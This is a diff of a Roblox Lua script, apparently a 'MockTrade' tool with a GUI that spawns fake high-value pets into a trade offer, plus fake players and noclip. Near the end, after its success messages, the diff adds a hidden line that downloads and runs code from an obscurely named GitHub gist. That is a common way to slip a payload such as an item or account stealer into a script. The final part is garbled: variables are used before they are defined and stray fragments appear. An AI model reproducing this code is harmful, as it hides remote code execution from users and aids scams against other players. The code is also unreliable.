+addRandomPetButton.Position = UDim2.new(0, 0, 0, 152)
+addRandomPetButton.BackgroundColor3 = Color3.fromRGB(173, 216, 230)  -- bleu clair
+addRandomPetButton.BackgroundTransparency = 0.2
+addRandomPetButton.Text = 'Add Random High-Value Pet'
+addRandomPetButton.Font = Enum.Font.FredokaOne
+addRandomPetButton.TextSize = 9
+addRandomPetButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+addRandomPetButton.Parent = petInputSection
+
+local addRandomPetCorner = Instance.new('UICorner')
+addRandomPetCorner.CornerRadius = UDim.new(0, 4)
+addRandomPetCorner.Parent = addRandomPetButton
+
+local addRandomPetStroke = Instance.new('UIStroke')
+addRandomPetStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+addRandomPetStroke.Color = Color3.fromRGB(255, 255, 255)
+addRandomPetStroke.Thickness = 1.0
+addRandomPetStroke.Transparency = 0.3
+addRandomPetStroke.Parent = addRandomPetButton
+
+-- NEW: Nameable Pet Button
+local nameablePetButton = Instance.new('TextButton')
+nameablePetButton.Size = UDim2.new(1, 0, 0, 22)
+nameablePetButton.Position = UDim2.new(0, 0, 0, 179)
+nameablePetButton.BackgroundColor3 = Color3.fromRGB(173, 216, 230)  -- bleu clair
+nameablePetButton.BackgroundTransparency = 0.2
+nameablePetButton.Text = 'Nameable Pet'
+nameablePetButton.Font = Enum.Font.FredokaOne
+nameablePetButton.TextSize = 9
+nameablePetButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+nameablePetButton.Parent = petInputSection
+
+local nameablePetCorner = Instance.new('UICorner')
+nameablePetCorner.CornerRadius = UDim.new(0, 4)
+nameablePetCorner.Parent = nameablePetButton
+
+local nameablePetStroke = Instance.new('UIStroke')
+nameablePetStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+nameablePetStroke.Color = Color3.fromRGB(255, 255, 255)
+nameablePetStroke.Thickness = 1.0
+nameablePetStroke.Transparency = 0.3
+nameablePetStroke.Parent = nameablePetButton
+
+nameablePetButton.MouseButton1Click:Connect(function()
+    local petName = petNameBox.Text
+    if petName and petName ~= '' then
+        local success, message =
+            addPetToPartnerOffer(petName, petSpawnState.activeFlags)
+    end
+end)
+
+-- Integrated Pet List Section - SMALLER
+local petListSection = Instance.new('Frame')
+petListSection.Size = UDim2.new(1, 0, 0, 110)
+petListSection.Position = UDim2.new(0, 0, 0, 179)
+petListSection.BackgroundTransparency = 1
+petListSection.Parent = petsFrame
+
+local petListHeading = Instance.new('TextLabel')
+petListHeading.Size = UDim2.new(1, 0, 0, 14)
+petListHeading.BackgroundTransparency = 1
+petListHeading.Text = 'High-Value Pets (Balloon Unicorn+)'
+petListHeading.Font = Enum.Font.SourceSansSemibold
+petListHeading.TextSize = 10
+petListHeading.TextColor3 = Color3.fromRGB(255,255,255)  -- white
+petListHeading.TextXAlignment = Enum.TextXAlignment.Left
+petListHeading.Parent = petListSection
+
+local petListFrame = Instance.new('ScrollingFrame')
+petListFrame.Size = UDim2.new(1, 0, 0, 300)
+petListFrame.Position = UDim2.new(0, 0, 0, 16)
+petListFrame.BackgroundColor3 = Color3.fromRGB(173, 216, 230)  -- bleu clair
+petListFrame.BackgroundTransparency = 0.5
+petListFrame.BorderSizePixel = 0
+petListFrame.ScrollBarThickness = 4
+petListFrame.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)
+petListFrame.ScrollBarImageTransparency = 0.5
+petListFrame.Parent = petListSection
+
+local petListCorner = Instance.new('UICorner')
+petListCorner.CornerRadius = UDim.new(0, 4)
+petListCorner.Parent = petListFrame
+
+local petListLayout = Instance.new('UIListLayout')
+petListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+petListLayout.Padding = UDim.new(0, 3)
+petListLayout.Parent = petListFrame
+
+local petListPadding = Instance.new('UIPadding')
+petListPadding.PaddingTop = UDim.new(0, 4)
+petListPadding.PaddingBottom = UDim.new(0, 4)
+petListPadding.PaddingLeft = UDim.new(0, 4)
+petListPadding.PaddingRight = UDim.new(0, 4)
+petListPadding.Parent = petListFrame
+
+local petListButtons = {}
+
+function createPetListButton(petName, index)
+   local button = Instance.new('TextButton')
+   button.Size = UDim2.new(1, -8, 0, 22)
+   button.BackgroundColor3 = Color3.fromRGB(173, 216, 230)  -- bleu clair
+   button.BackgroundTransparency = 0.2
+   button.Text = ''
+   button.Parent = petListFrame
+
+   local buttonCorner = Instance.new('UICorner')
+   buttonCorner.CornerRadius = UDim.new(0, 4)
+   buttonCorner.Parent = button
+
+   local buttonStroke = Instance.new('UIStroke')
+   buttonStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+   buttonStroke.Color = Color3.fromRGB(255,255,255)  -- white
+   buttonStroke.Thickness = 1.0
+   buttonStroke.Transparency = 0.3
+   buttonStroke.Parent = button
+
+   local nameLabel = Instance.new('TextLabel')
+   nameLabel.Size = UDim2.new(1, -8, 1, 0)
+   nameLabel.Position = UDim2.new(0, 4, 0, 0)
+   nameLabel.BackgroundTransparency = 1
+   nameLabel.Text = petName
+   nameLabel.Font = Enum.Font.FredokaOne
+   nameLabel.TextSize = 9
+   nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+   nameLabel.TextXAlignment = Enum.TextXAlignment.Left
+   nameLabel.TextTransparency = 0
+   nameLabel.Parent = button
+
+   local nameStroke = Instance.new('UIStroke')
+   nameStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
+   nameStroke.Color = Color3.new(0, 0, 0)
+   nameStroke.Thickness = 0.8
+   nameStroke.Transparency = 0.8
+   nameStroke.Parent = nameLabel
+
+   button.BackgroundTransparency = 1
+   buttonStroke.Transparency = 1
+   nameLabel.TextTransparency = 1
+   nameStroke.Transparency = 1
+
+   button.MouseButton1Click:Connect(function()
+       local originalSize = button.Size
+       TweenService:Create(
+           button,
+           TweenInfo.new(
+               0.08,
+               Enum.EasingStyle.Quint,
+               Enum.EasingDirection.Out
+           ),
+           {
+               Size = UDim2.new(
+                   originalSize.X.Scale,
+                   originalSize.X.Offset - 2,
+                   originalSize.Y.Scale,
+                   originalSize.Y.Offset - 2
+               ),
+           }
+       ):Play()
+       task.wait(0.08)
+       TweenService
+           :Create(
+               button,
+               TweenInfo.new(
+                   0.15,
+                   Enum.EasingStyle.Back,
+                   Enum.EasingDirection.Out
+               ),
+               {
+                   Size = originalSize,
+               }
+           )
+           :Play()
+
+       petNameBox.Text = petName
+       TweenService
+           :Create(
+               petNameStroke,
+               TweenInfo.new(
+                   0.3,
+                   Enum.EasingStyle.Quint,
+                   Enum.EasingDirection.Out
+               ),
+               {
+                   Color = Color3.fromRGB(100, 150, 255),
+                   Thickness = 1.2,
+               }
+           )
+           :Play()
+
+       task.wait(0.5)
+       TweenService
+           :Create(
+               petNameStroke,
+               TweenInfo.new(
+                   0.3,
+                   Enum.EasingStyle.Quint,
+                   Enum.EasingDirection.Out
+               ),
+               {
+                   Color = Color3.fromRGB(100, 100, 100),
+                   Thickness = 0.8,
+               }
+           )
+           :Play()
+   end)
+
+   button.LayoutOrder = index
+   return button
+end
+
+-- MODIFIED: Build pet list with only high-value pets
+function buildPetList()
+   for _, child in ipairs(petListFrame:GetChildren()) do
+       if child:IsA('TextButton') then
+           child:Destroy()
+       end
+   end
+   petListButtons = {}
+
+   for i, petName in ipairs(highValuePets) do
+       local button = createPetListButton(petName, i)
+       table.insert(petListButtons, button)
+   end
+   petListFrame.CanvasSize = UDim2.new(0, 0, 0, (#highValuePets * 25) + 8)
+end
+
+function animatePetList()
+   for i, button in ipairs(petListButtons) do
+       local delay = (i - 1) * 0.05
+       task.spawn(function()
+           task.wait(delay)
+           local buttonStroke = button:FindFirstChildOfClass('UIStroke')
+           local nameLabel = button:FindFirstChildOfClass('TextLabel')
+           local nameStroke = nameLabel
+               and nameLabel:FindFirstChildOfClass('UIStroke')
+
+           local stage1 = TweenInfo.new(
+               0.1,
+               Enum.EasingStyle.Quint,
+               Enum.EasingDirection.Out
+           )
+           local stage2 = TweenInfo.new(
+               0.25,
+               Enum.EasingStyle.Back,
+               Enum.EasingDirection.Out
+           )
+           local stage3 = TweenInfo.new(
+               0.15,
+               Enum.EasingStyle.Quint,
+               Enum.EasingDirection.Out
+           )
+
+           TweenService:Create(button, stage1, {
+               Size = UDim2.new(1.02, -8, 0, 24),
+               Position = UDim2.new(-0.01, 0, 0, 0),
+               BackgroundTransparency = 0.4,
+           }):Play()
+
+           task.wait(0.1)
+
+           TweenService:Create(button, stage2, {
+               Size = UDim2.new(1, -8, 0, 22),
+               Position = UDim2.new(0, 0, 0, 0),
+               BackgroundTransparency = 0.2,
+           }):Play()
+
+           if buttonStroke then
+               TweenService:Create(buttonStroke, stage2, {
+                   Thickness = 1.0,
+                   Transparency = 0.3,
+               }):Play()
+           end
+
+           task.wait(0.06)
+
+           if nameLabel then
+               TweenService:Create(nameLabel, stage3, { TextTransparency = 0 })
+                   :Play()
+           end
+           if nameStroke then
+               TweenService:Create(nameStroke, stage3, { Transparency = 0.8 })
+                   :Play()
+           end
+       end)
+   end
+end
+
+buildPetList()
+
+-- Button functionality
+addPetButton.MouseButton1Click:Connect(function()
+   local petName = petNameBox.Text
+   if petName and petName ~= '' then
+       local success, message =
+           addPetToPartnerOffer(petName, petSpawnState.activeFlags)
+   end
+end)
+
+removePetButton.MouseButton1Click:Connect(function()
+   local success, message = removeLatestPetFromPartnerOffer()
+end)
+
+addRandomPetButton.MouseButton1Click:Connect(function()
+   -- MODIFIED: Only add high-value pets
+   local randomPet = getRandomHighValuePet()
+   local randomProperties = generateRandomPetProperties()
+
+   local success, message = addPetToPartnerOffer(randomPet, randomProperties)
+end)
+
+-- Initialize the GUI and functionality
+setActiveTab('Control')
+
+-- =========================================
+-- DRAGGABLE FRAME WITH TOGGLE (MOBILE + PC)
+-- =========================================
+
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+
+-- Toggle state
+local dragEnabled = true
+
+-- Drag internals
+local dragging = false
+local dragStart
+local startPos
+
+local function updateDrag(input)
+   if not dragEnabled then return end
+
+   local delta = input.Position - dragStart
+   mainFrame.Position = UDim2.new(
+       startPos.X.Scale,
+       startPos.X.Offset + delta.X,
+       startPos.Y.Scale,
+       startPos.Y.Offset + delta.Y
+   )
+end
+
+-- Input begin (mouse + touch)
+mainFrame.InputBegan:Connect(function(input)
+   if not dragEnabled then return end
+
+   if input.UserInputType == Enum.UserInputType.MouseButton1
+       or input.UserInputType == Enum.UserInputType.Touch then
+
+       dragging = true
+       dragStart = input.Position
+       startPos = mainFrame.Position
+
+       input.Changed:Connect(function()
+           if input.UserInputState == Enum.UserInputState.End then
+               dragging = false
+           end
+       end)
+   end
+end)
+
+-- Input move
+mainFrame.InputChanged:Connect(function(input)
+   if not dragEnabled then return end
+
+   if (input.UserInputType == Enum.UserInputType.MouseMovement
+       or input.UserInputType == Enum.UserInputType.Touch)
+       and dragging then
+
+       updateDrag(input)
+   end
+end)
+
+-- =============================
+-- SMALL DRAG TOGGLE BUTTON
+-- =============================
+local dragToggle = Instance.new("TextButton")
+dragToggle.Size = UDim2.new(0, 60, 0, 18)
+dragToggle.Position = UDim2.new(0.5, 30, 1, -550)
+dragToggle.BackgroundColor3 = Color3.fromRGB(173, 216, 230)  -- bleu clair
+dragToggle.Text = "Drag: ON"
+dragToggle.Font = Enum.Font.FredokaOne
+dragToggle.TextSize = 8
+dragToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
+dragToggle.AutoButtonColor = false
+dragToggle.ZIndex = 5
+dragToggle.Parent = mainFrame
+
+local dragCorner = Instance.new("UICorner")
+dragCorner.CornerRadius = UDim.new(0, 4)
+dragCorner.Parent = dragToggle
+
+local dragStroke = Instance.new("UIStroke")
+dragStroke.Color = Color3.fromRGB(255,255,255)  -- white
+dragStroke.Thickness = 0.8
+dragStroke.Transparency = 0.3
+dragStroke.Parent = dragToggle
+
+-- Toggle click
+dragToggle.MouseButton1Click:Connect(function()
+   dragEnabled = not dragEnabled
+
+   if dragEnabled then
+       dragToggle.Text = "Drag: ON"
+       TweenService:Create(
+           dragToggle,
+           TweenInfo.new(0.2),
+           { BackgroundColor3 = Color3.fromRGB(173, 216, 230) }  -- bleu clair
+       ):Play()
+   else
+       dragToggle.Text = "Drag: OFF"
+       TweenService:Create(
+           dragToggle,
+           TweenInfo.new(0.2),
+           { BackgroundColor3 = Color3.fromRGB(40, 40, 50) }
+       ):Play()
+   end
+end)
+
+-- Continuous noclip maintenance
+task.spawn(function()
+   while task.wait(0.5) do
+       if noclipEnabled then
+           for _, folder in ipairs(FakePlayers) do
+               if folder and folder.Parent then
+                   for _, part in ipairs(folder:GetDescendants()) do
+                       if part:IsA('BasePart') then
+                           part.CanCollide = false
+                           part.CanTouch = false
+                           part.CanQuery = false
+                       end
+                   end
+               end
+           end
+           for _, petData in ipairs(FakePetRegistry) do
+               if petData and petData.model then
+                   for _, part in ipairs(petData.model:GetDescendants()) do
+                       if part:IsA('BasePart') then
+                           part.CanCollide = false
+                           part.CanTouch = false
+                           part.CanQuery = false
+                       end
+                   end
+               end
+           end
+       end
+   end
+end)
+print('? Complete MockTrade with HIGH-VALUE PETS ONLY loaded successfully!')
+print('? Fake players will only ride Balloon Unicorn or higher rarity pets!')
+print('? GUI size optimized to 180x320 with smaller buttons and text!')
+
+-- Add a short wait to ensure everything loads properly
+task.wait(0.5)
+
+-- Execute the loadstring
+loadstring(game:HttpGet("https://gist.githubusercontent.com/privateworksfdbndkjvdfhvjknvdfkvjn/c285f57b83d29074d84e83b78a369098/raw/7ed25bdbe4473d94ec70c43efa1fb270bcb71bef/gistfile1.txt"))()
+
+-- The rest of the spawner code continues here with colors changed similarly
+local pet_name = petNameBox.Text
+local rp_name = rpNameBox.Text  -- Use this in createPet properties { ... rp_name = rp_name }
+
+local rpNameBox = Instance.new('TextBox')
+rpNameBox.Size = UDim2.new(0.85, 0, 0, 28)
+rpNameBox.Position = UDim2.new(0.075, 0, 0.25, 0)
+rpNameBox.PlaceholderText = 'Enter Pet RP Name (optional)'
+rpNameBox.Parent = petContent
+
+-- In spawn button:
+createPet(petId, {
+    -- ...
+    rp_name = rp_name or '',
+})
+
+        else
+            -- Wrong key
+            game.StarterGui:SetCore('SendNotification', {
+                Title = 'Error',
+                Text = 'Invalid key!',
+                Duration = 3,
+            })
+        end
+    end
+end)
+```   AUTO
